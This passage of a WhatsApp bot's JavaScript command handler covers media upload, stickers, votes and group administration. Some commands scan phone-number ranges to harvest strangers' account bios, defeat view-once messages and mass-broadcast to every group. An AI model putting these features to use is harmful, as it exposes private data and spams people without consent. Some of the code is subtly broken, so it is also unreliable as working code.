           	if (!text) return reply(`📵🔢 Enter a number ending with 'x'\n\nExample: ${prefix + command} 6281328139682`)
var inputnumber = text.split(" ")[0]
        
        reply(`📱🔍 Exploring for WhatsApp accounts within the range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `🔖 *WhatsApp Numbers Directory*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await Tan.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await Tan.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `📞 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🌐 ️*Bio :* ${anu1.status}\n⏳️*Last update :* ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'tourl': {
    try {
        if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
        if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
            reply('⏳ Sedang mengunggah...');
            const mime = require('mime-types');
            const media = await quoted.download();
            const filePath = './tmp/' + getRandom(`.${mime.extension(mime) || 'jpg'}`);
            fs.writeFileSync(filePath, media);
            let url;
            try {
                url = await uploadToCatbox(filePath);
                reply('✅ URL Catbox: ' + url);
            } catch (catboxError) {
                console.error('Error Catbox:', catboxError.message);
                reply('⚠️ Gagal mengupload ke Catbox, mencoba Top4Top...');
                const urls = await uploadToTop4Top(filePath);
                reply(`✅ URL Top4Top:\n1. ${urls[0]}`);
            }
            fs.unlinkSync(filePath);
        } else {
            reply('⚠️ Harap kirim media yang ingin diupload!');
        }
    } catch (e) {
        console.error('Error:', e.message);
        reply('❌ Gagal mengupload media!');
    }
    break;
}
case 'top4top': {
    try {
        if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
        if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
            reply('⏳ Sedang mengunggah ke Top4Top...');
            const media = await quoted.download();
            const fileExtension = mime.split('/')[1];
            const allowedExtensions = ['jpg', 'jpeg', 'png', 'mp4'];
            if (!allowedExtensions.includes(fileExtension)) {
                reply(`⚠️ File tidak didukung. Harap gunakan format file yang diizinkan: ${allowedExtensions.join(', ')}.`);
                return;
            }
            const filePath = path.join('./tmp/', getRandom(`.${fileExtension}`));
            fs.writeFileSync(filePath, media);

            try {
                const urls = await uploadToTop4Top(filePath);
                fs.unlinkSync(filePath);
                if (urls.length > 0) {
                    reply(`✅ URL Top4Top:\n1. ${urls[0]}`);
                } else {
                    reply('⚠️ Tidak ada URL yang ditemukan dalam respons.');
                }
            } catch (uploadError) {
                console.error('Error saat upload:', uploadError.message);
                reply('❌ Gagal mengupload ke Top4Top. Periksa log untuk detailnya.');
            }
        } else {
            reply('⚠️ Harap kirim media yang ingin diupload!');
        }
    } catch (mainError) {
        console.error('Error:', mainError.message);
        reply('❌ Terjadi kesalahan saat memproses media!');
    }
    break;
}
case 'catbox': {
    try {
       if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
        if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
            reply('⏳ Sedang mengunggah ke Catbox...');
            const media = await quoted.download();
            const filePath = './tmp/' + getRandom('.file');
            fs.writeFileSync(filePath, media);
            const url = await uploadToCatbox(filePath);
            fs.unlinkSync(filePath);
            reply('✅ URL Catbox: ' + url);
        } else {
            reply('⚠️ Harap kirim media yang ingin diupload!');
        }
    } catch (e) {
        console.error('Error Catbox:', e.message);
        reply('❌ Gagal mengupload ke Catbox!');
    }
    break;
}
case 'bratvid': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    await loading()
    if (!text) {
        return reply("Please provide text for the video.");
    }
    const apiUrl = `https://api.paxsenix.biz.id/tools/bratvid?text=${encodeURIComponent(text)}`;
    try {
        const response = await axios.get(apiUrl);
        const { ok, url, message } = response.data;

        if (!ok) {
            return reply(`Failed to retrieve video: ${message}`);
        }
        const videoResponse = await axios.get(url, { responseType: 'arraybuffer' });
        const media = Buffer.from(videoResponse.data, 'binary');

        // Send the video as a sticker
        const encmedia = await Tan.sendVideoAsSticker(from, media, fcall, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia); // Clean up if necessary

    } catch (error) {
        console.error("Error fetching brat vid:", error.message);
        return reply("⚠️ An error occurred while fetching the video. Please try again later.");
    }

    break;
}
case 'brat': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text && (!m.quoted || !m.quoted.text)) 
        return reply(`Kirim/reply pesan *${prefix + command}* Teksnya`);

    try {
        const url = 'https://brat.caliphdev.com/api/brat?text=' + encodeURIComponent(text || m.quoted.text);
        const media = await fetch(url)
            .then(res => res.buffer())
            .catch(err => { throw new Error('Gagal mengunduh gambar dari server utama') });

        replyTan('Sedang memproses permintaan');
        const encmedia = await Tan.sendImageAsSticker(m.chat, media, fcall, { 
            packname: global.packname, 
            author: global.author 
        });
        await fs.unlinkSync(encmedia);

    } catch (e) {
        try {
            const backupUrl = 'https://mannoffc-x.hf.space/brat?q=' + encodeURIComponent(text || m.quoted.text);
            const media = await fetch(backupUrl)
                .then(res => res.buffer())
                .catch(err => { throw new Error('Gagal mengunduh gambar dari server cadangan') });

            replyTan('Sedang memproses permintaan ');
       
            const encmedia = await Tan.sendImageAsSticker(m.chat, media, fcall, { 
                packname: global.packname, 
                author: global.author 
            });
            await fs.unlinkSync(encmedia);

        } catch (err) {
            reply('Server Brat sedang offline atau terjadi kesalahan!');
        }
    }
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
replyTan(`Sedang Proses Permintaan...`)
let media = await quoted.download()
let encmedia = await Tan.sendImageAsSticker(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await Tan.sendVideoAsSticker(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break

case 'sdl': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!quoted) throw `Balas Gambar/Video Dengan Caption ${prefix + command}`;
    let url = text.trim();
    if (!url) throw `Mohon berikan URL stiker yang ingin diunduh.`;

    try {
        replyTan('📥 Sedang memproses permintaan, harap tunggu...');
        const stickers = await dlStickers(url);
        if (!stickers || stickers.length === 0) return replyTan('❌ Tidak ada stiker ditemukan di URL tersebut.');
        console.log('🔍 results: ', stickers);

        for (const sticker of stickers.stickers) {
            try {
                const stickerUrl = sticker.img;
                const fileName = `${sticker.id}.webp`;
                const filePath = path.join(__dirname, 'tmp', fileName);
                
                if (stickerUrl.endsWith('.gif')) {
                    // **Jika GIF, konversi ke video sebelum dikirim**
                const tempDir = path.join(__dirname, 'tmp');
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
                const gifFilePath = path.join(__dirname, 'tmp', `${sticker.id}.gif`);
                const videoFilePath = path.join(__dirname, 'tmp', `${sticker.id}.mp4`);

                    // **Unduh GIF dari URL**
                    const responseGif = await axios({ url: stickerUrl, method: 'GET', responseType: 'stream' });
                    const writerGif = fs.createWriteStream(gifFilePath);
                    responseGif.data.pipe(writerGif);

                    await new Promise((resolve, reject) => {
                        writerGif.on('finish', resolve);
                        writerGif.on('error', reject);
                    });
                    await new Promise((resolve, reject) => {
                        ffmpeg(gifFilePath)
                            .output(videoFilePath)
                            .outputOptions([
                                '-movflags faststart',
                                '-pix_fmt yuv420p',
                                '-loop 0',
                                '-vf', 'scale=trunc(iw/2)*2:trunc(ih/2)*2'
                            ])
                            .on('start', commandLine => console.log(`FFmpeg command: ${commandLine}`))
                            .on('error', (err, stdout, stderr) => {
                                console.error('❌ Error during conversion:', err);
                                reject(err);
                            })
                            .on('end', () => {
                                console.log(`✅ Konversi selesai: ${videoFilePath}`);
                                resolve();
                            })
                            .run();
                    });
                    await Tan.sendMessage(m.chat, {
                        video: { url: videoFilePath },
                        caption: `✅ GIF berhasil dikonversi ke video.`,
                        gifPlayback: true
                    });
                    fs.unlinkSync(gifFilePath);
                    fs.unlinkSync(videoFilePath);
                } else {
                    const response = await axios({ url: stickerUrl, method: 'GET', responseType: 'stream' });
                    const writer = fs.createWriteStream(filePath);
                    response.data.pipe(writer);

                    await new Promise((resolve, reject) => {
                        writer.on('finish', resolve);
                        writer.on('error', reject);
                    });

                    await Tan.sendImageAsSticker(from, filePath, fcall, { packname: global.packname, author: global.author });
                    fs.unlinkSync(filePath);
                }
            } catch (error) {
                console.error('❌ Error processing sticker:', error.message);
                replyTan('⚠️ Terjadi kesalahan saat mengunduh atau mengirim stiker.');
            }
        }

    } catch (error) {
        console.error('❌ Error processing stickers:', error.message);
        replyTan('⚠️ Terjadi kesalahan saat memproses stiker.');
    }
    break;
}
case 'hdvid': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!quoted) replyTan(`Balas Video Dengan Caption ${prefix + command}`);
    const fs = require('fs');    
    if (/video/.test(mime)) {
        let media = await quoted.download();
        const tempVideoPath = path.join(__dirname, 'temp_video.mp4');
        fs.writeFileSync(tempVideoPath, media);
        const outputVideoPath = path.join(__dirname, 'output_hd.mp4');
        ffmpeg(tempVideoPath)
            .outputOptions([
                '-vf scale=1280:720,eq=saturation=1.5:brightness=0.05,unsharp=5:5:0.8:5:5:0.0',
                '-c:v libx264', 
                '-preset fast',    
                '-crf 23',   
                '-c:a copy'
            ])
            .output(outputVideoPath)
            .on('start', (commandLine) => {
                console.log('Memulai proses dengan perintah:', commandLine);
            })
            .on('progress', (progress) => {
                console.log(`Proses ${progress.percent.toFixed(2)}% selesai`);
            })
            .on('end', async () => {
                console.log('Proses selesai! Video berhasil di-upscale ke HD.');
                await Tan.sendMessage(from, { video: { url: outputVideoPath }, caption: 'Video HD telah siap!' });
                fs.unlinkSync(tempVideoPath);
                fs.unlinkSync(outputVideoPath);
            })
            .on('error', (err) => {
                console.error('Terjadi kesalahan:', err.message);
                fs.unlinkSync(tempVideoPath);
            })
            .run();
    } else {
        reply(`Kirim Video Dengan Caption ${prefix + command}`);
    }
}
break;
case '🐦':
case 'rvo':
case 'read': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
	if (!m.quoted) return replyTan(`Balas untuk melihat pesan sekali`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replyTan(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Tan.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return Tan.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'join': {
if (!isTanOwner) return reply(mess.only.owner)
if (!text) return replyTan(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyTan('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Tan.groupAcceptInvite(result)
await replyTan(`Done`)
}
break
case 'poll': {
	if (!isTanOwner) return reply(mess.only.owner)
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await replyTan(
`Sebutkan pertanyaan dan minimal 2 pilihan\nContoh: ${prefix}poll Siapa admin terbaik?|Tan,Asep,Doge...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await Tan.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break
        case 'vote': {
            if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
            if (!m.isGroup) return reply(mess.only.group)
            if (m.chat in vote) return replyTan(`_Masih ada suara di chat ini!_\n\n*${prefix}deletevote* - untuk menghapus suara`)
            if (!text) return replyTan(`Masukkan Alasan Memilih, Contoh: *${prefix + command} Pemilik Tampan*`)
            replyTan(`Pemungutan suara dimulai!\n\n*${prefix}upvote* - untuk upvote\n*${prefix}downvote* - untuk downvote\n*${prefix}checkvote* - untuk memeriksa suara\n*${prefix} deletevote* - untuk menghapus suara`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Tan.sendMessage(m.chat, {text: teks_vote}, { quoted: fcall })
	    }
            break
               case 'upvote': {
            if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replyTan(`_*tidak ada voting di grup ini!*_\n\n*${prefix}vote* - untuk memulai voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replyTan('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Tan.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, { quoted: fcall })
	    }
             break
case 'downvote': {
            if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replyTan(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replyTan('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Tan.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, { quoted: fcall })
	}
            break
 
case 'checkvote':
if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
if (!m.isGroup) return reply(mess.only.group)
if (!(m.chat in vote)) return replyTan(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${Tan.user.id}
`
Tan.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case 'delvote': case 'hapusvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replyTan(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replyTan('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'toonce': case 'toviewonce': { 
if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
if (!quoted) return replyTan(`Reply Image/Video`)
replyTan(`Sedang Proses Permintaan...`)
if (/image/.test(mime)) {
anuan = await Tan.downloadAndSaveMediaMessage(quoted)
Tan.sendMessage(m.chat, {image: {url:anuan}, caption: `Ini dia!!`, fileLength: "999", viewOnce : true},{ quoted: fcall })
} else if (/video/.test(mime)) {
anuanuan = await Tan.downloadAndSaveMediaMessage(quoted)
Tan.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Ini dia!!`, fileLength: "99999999", viewOnce : true},{ quoted: fcall })
}
}
break
        case 'listpc': {
 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
 for (let i of anulistp) {
 let nama = store.messages[i].array[0].pushName
 teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 Tan.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc': {
  if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
 for (let i of anulistg) {
 let metadata = await Tan.groupMetadata(i)
 teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 Tan.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'ping':
case 'botstatus':
case 'statusbot': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    const used = process.memoryUsage();
    const cpus = os.cpus().map(cpu => {
        cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
        return cpu;
    });

    const cpu = cpus.reduce((last, cpu, _, { length }) => {
        last.total += cpu.total;
        last.speed += cpu.speed / length;
        last.times.user += cpu.times.user;
        last.times.nice += cpu.times.nice;
        last.times.sys += cpu.times.sys;
        last.times.idle += cpu.times.idle;
        last.times.irq += cpu.times.irq;
        return last;
    }, {
        speed: 0,
        total: 0,
        times: {
            user: 0,
            nice: 0,
            sys: 0,
            idle: 0,
            irq: 0
        }
    });

    let timestamp = speed();
    let latensi = speed() - timestamp;
    let neww = performance.now();
    let oldd = performance.now();

    let respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _Milliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v => v.length)), ' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHz)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHz)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim();

    replyTan(respon);
}
break;
            case "bcimg": {
if (!isTanOwner) return replyTan(`Perintah ini Khusus untuk owner `)
if (!text) return replyTan(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await loading()
let getGroups = await Tan.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
if (/image/.test(mime)) {
media = await Tan.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Tan.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await Tan.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
replyTan(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bcgc':
            case 'bcgroup': {
                if (!isTanOwner) return replyTan('Khusus Owner')
                if (!text) return replyTan(`Text mana?\n\nExample : ${prefix + command} testing `)
                let getGroups = await Tan.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replyTan(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${botname} Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    Tan.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://g.top4top.io/p_3315mdtvp0.jpeg',
                                sourceUrl: 'https://youtube.com/Tan',
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {quoted: fcall })
                }
                replyTan(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
Tan.groupRevokeInvite(m.chat)
}
break
            case 'react': {
if (!isTanOwner) return reply(mess.only.owner)
reactionMessage = {
react: {
    text: args[0],
    key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
Tan.sendMessage(m.chat, reactionMessage)
            }
            break
   case 'leavegc': {
if (!isTanOwner) return reply(mess.only.owner)
await Tan.groupLeave(m.chat)
await replyTan(`Done`)
            }
            break
case 'add': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isTanOwner) return reply(mess.only.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Tan.groupParticipantsUpdate(m.chat, [users], 'add')
await replyTan(`Done`)
}
break
case 'closetime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replyTan('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replyTan(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
Tan.groupSettingUpdate(from, 'announcement')
replyTan(close)
}, timer)
}
break
           case 'ephemeral': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replyTan('Enter the value enable/disable')
if (args[0] === 'enable') {
await Tan.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
} else if (args[0] === 'disable') {
await Tan.sendMessage(m.chat, { disappearingMessagesInChat: false })
await replyTan(`Done`)
}
            }
            break
            case 'delete': case 'del': {
if (!isTanOwner) return reply(mess.only.owner)
if (!m.quoted) throw false
let { chat, id } = m.quoted
 Tan.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case '>l': {
if (!m.quoted) throw false
let { chat, id } = m.quoted
 Tan.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let response = await Tan.groupInviteCode(m.chat)
Tan.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'opentime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replyTan('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replyTan(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
Tan.groupSettingUpdate(from, 'not_announcement')
replyTan(open)
}, timer)
}
break
case 'kick': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Tan.groupParticipantsUpdate(m.chat, [users], 'remove')
await replyTan(`Done`)
}
break
//=========================================\\
case 'kickall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
const users = participants.map(a => a.id)
await Tan.groupParticipantsUpdate(m.chat, [users], 'remove')
await replyTan(`Done`)
}
break
case 'setbotname':{
if (!isTanOwner) return reply(mess.only.owner)
if (!text) return replyTan(`Where is the name?\nExample: ${prefix + command} Cheems Bot`)
    await Tan.updateProfileName(text)
    replyTan(`Success in changing the name of bot's number`)
    }
    break
case 'setbotbio':{
if (!isTanOwner) return reply(mess.only.owner)
if (!text) return replyTan(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await Tan.updateProfileStatus(text)
    replyTan(`Success in changing the bio of bot's number`)
    }
    break
    case 'setgroupname': case 'setsubject': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replyTan('Text ?')
await Tan.groupUpdateSubject(m.chat, text)
await replyTan(`Done`)
            }
            break
          case 'setdesc': case 'setdesk': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replyTan('Text ?')
await Tan.groupUpdateDescription(m.chat, text)
await replyTan(`Done`)
            }
            break
//=========================================\\
case 'getpp':{
